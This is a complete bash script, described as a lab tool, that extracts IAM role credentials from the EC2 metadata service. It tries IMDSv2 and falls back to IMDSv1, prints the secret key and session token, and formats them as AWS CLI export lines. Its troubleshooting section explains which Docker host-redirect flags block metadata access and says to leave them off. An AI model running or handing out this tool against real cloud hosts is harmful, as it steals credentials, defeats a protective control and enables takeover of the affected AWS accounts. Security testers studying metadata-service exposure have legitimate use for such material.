#!/bin/bash

# Script to extract IAM role credentials from EC2 metadata service
# For security testing/lab environments only

echo "==== IAM Credential Extractor (Lab Use Only) ===="
echo ""

# Function to check if metadata service is accessible
check_metadata_access() {
    echo "[*] Checking metadata service accessibility..."
    
    # Try to reach metadata service
    if timeout 2 curl -s http://169.254.169.254/ > /dev/null 2>&1; then
        echo "[+] Metadata service is accessible"
        return 0
    else
        echo "[-] Metadata service is NOT accessible"
        echo "    This could be because:"
        echo "    1. Container is blocking access (--add-host redirects)"
        echo "    2. IMDSv2 is enforced and needs token"
        echo "    3. Network isolation"
        return 1
    fi
}

# Function to get IMDSv2 token
get_token() {
    echo "[*] Getting IMDSv2 token..."
    TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
    
    if [ -z "$TOKEN" ]; then
        echo "[-] Failed to get IMDSv2 token"
        echo "    Trying IMDSv1 fallback..."
        return 1
    else
        echo "[+] Got IMDSv2 token: ${TOKEN:0:20}..."
        return 0
    fi
}

# Function to get role name
get_role_name() {
    local use_token=$1
    echo "[*] Getting IAM role name..."
    
    if [ "$use_token" = "true" ]; then
        ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
            http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
    else
        # IMDSv1 fallback
        ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
    fi
    
    if [ -z "$ROLE_NAME" ]; then
        echo "[-] No IAM role found attached to instance"
        return 1
    else
        echo "[+] Found IAM role: $ROLE_NAME"
        return 0
    fi
}

# Function to get credentials
get_credentials() {
    local use_token=$1
    echo "[*] Getting IAM credentials for role: $ROLE_NAME"
    
    if [ "$use_token" = "true" ]; then
        CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
            http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null)
    else
        # IMDSv1 fallback
        CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null)
    fi
    
    if [ -z "$CREDS" ] || [[ "$CREDS" == *"404"* ]]; then
        echo "[-] Failed to get credentials"
        return 1
    else
        echo "[+] Successfully retrieved credentials!"
        echo ""
        echo "==== IAM Credentials ===="
        echo "$CREDS" | jq . 2>/dev/null || echo "$CREDS"
        return 0
    fi
}

# Function to export credentials as environment variables
export_credentials() {
    if [ -n "$CREDS" ]; then
        echo ""
        echo "[*] Exporting credentials as environment variables..."
        
        # Parse credentials
        ACCESS_KEY=$(echo "$CREDS" | jq -r '.AccessKeyId' 2>/dev/null || echo "$CREDS" | grep -oP '"AccessKeyId"\s*:\s*"\K[^"]+')
        SECRET_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey' 2>/dev/null || echo "$CREDS" | grep -oP '"SecretAccessKey"\s*:\s*"\K[^"]+')
        SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token' 2>/dev/null || echo "$CREDS" | grep -oP '"Token"\s*:\s*"\K[^"]+')
        
        if [ -n "$ACCESS_KEY" ] && [ -n "$SECRET_KEY" ] && [ -n "$SESSION_TOKEN" ]; then
            echo ""
            echo "# Add these to your environment:"
            echo "export AWS_ACCESS_KEY_ID=\"$ACCESS_KEY\""
            echo "export AWS_SECRET_ACCESS_KEY=\"$SECRET_KEY\""
            echo "export AWS_SESSION_TOKEN=\"$SESSION_TOKEN\""
            echo ""
            echo "[+] You can now use AWS CLI with these credentials!"
        fi
    fi
}

# Main execution
main() {
    # Check metadata access
    if ! check_metadata_access; then
        echo ""
        echo "==== Troubleshooting ===="
        echo "If running in Docker, make sure you DON'T have these flags:"
        echo "  --add-host=169.254.169.254:127.0.0.1"
        echo "  --add-host=metadata.ec2.internal:127.0.0.1"
        echo ""
        echo "These redirect metadata service to localhost!"
        exit 1
    fi
    
    # Try IMDSv2 first
    if get_token; then
        if get_role_name "true" && get_credentials "true"; then
            export_credentials
        fi
    else
        # Fallback to IMDSv1
        echo "[*] Falling back to IMDSv1..."
        if get_role_name "false" && get_credentials "false"; then
            export_credentials
        fi
    fi
}

# Run main function
main 